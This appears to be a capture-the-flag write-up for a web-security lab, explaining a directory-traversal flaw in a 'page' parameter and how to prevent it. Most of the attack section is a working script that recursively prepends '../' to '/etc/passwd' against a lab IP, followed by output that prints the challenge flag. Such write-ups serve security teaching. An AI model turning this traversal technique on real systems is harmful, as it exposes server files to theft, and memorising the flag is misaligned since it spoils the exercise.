# Directoy traversal breach

## How we found the breach

Sources:

[portswigger →](https://portswigger.net/web-security/file-path-traversal)

[owasp →](https://owasp.org/www-community/attacks/Path_Traversal#:~:text=Cookie%3A%20TEMPLATE%3D../../../../../../../../../etc/passwd)

[infosecinstitute →](https://resources.infosecinstitute.com/topic/php-lab-file-inclusion-attacks/)

From the website's home page, after pressing the `Sign In` button we're redirected to `http://IP/?page=signin`.

Depending on how the server handles the params parsing we could pass filename containg absolute paths to other file from the server file system.

A commonly hacked sensitive file is the `/etc/psswd` containing a trace of every computer registered user.

[More information on /etc/passwd →](https://www.ibm.com/docs/bg/aix/7.2?topic=passwords-using-etcpasswd-file)

### Testing the /etc/passwd access

By hitting `http://IP/?page=signin` the server returns a page displaying an alert modal containing the label `WTF`

```html
<script>alert('Wtf ?');</script><!DOCTYPE HTML>
<html>
	<head>
		<title>BornToSec - Web Section</title>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<meta name="description" content="" />
		<meta name="keywords" content="" />
		<!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
		<script src="js/jquery.min.js"></script>
		<script src="js/skel.min.js"></script>
		<script src="js/skel-layers.min.js"></script>
		<script 
```

We can see that the server append a script tag on the begining of the page.

We need to dig deeper, considering that the served page could be located recursively anywhere in folders.

The required file path coudld have infinite number of `..`, this is why we'll need to code a small tool.

### The script

The following script will download the returned page for any `../etc/psswd` combination until he found within the first script tag the string `flag`. 

Note: This script assumes that the server will send back the flag in the first script tag, and even more that the flag will be displayed using the `flag` appelation.

```ts
// @ts-check
import got from 'got'
import * as cheerio from 'cheerio'

const searchedFile = `/etc/passwd`
const baseUrl = `http://192.168.56.101/?page=`

async function traverseDirectory(query) {

    const url = baseUrl + query;
    const htmlPage = await got(url).text()

    const $ = cheerio.load(htmlPage)
    const firstScriptTag = $('script').first().text();

    if (firstScriptTag.match(/flag/)) {
        console.log(firstScriptTag)
        return
    } else {
        console.log(firstScriptTag)
        const newQuery = `../${query}`
        return traverseDirectory(newQuery)
    }
}

await traverseDirectory(searchedFile)
```
By running the script we get the below output:

```bash
node script.js 

alert('Wtf ?');
alert('Wtf ?');
alert('Wrong..');
alert('Nope..');
alert('Almost.');
alert('Still nope..');
alert('Nope..');
alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');
```

## How to exploit the breach

By being able to browse the server file system the hacker could steal any kind of sensitive information.
He could also be able to execute previously uploaded script inside the server file tree

[See file upload breach →](../../php_script_as_jpg_metadata_file_upload_breach/Ressources/Explanations.md)

## How to avoid the breach

To avoid this breach is kinda the same thing as for the [Redirect securyt breach](../../mocking_referer_and_user_agent_curl_breach/Ressources/Explanations.md). The server should not be passing user-supplied input to the filesystem.

Either if it's necessary the server should be validating the input, using a `whitelist` `escaping` the received path.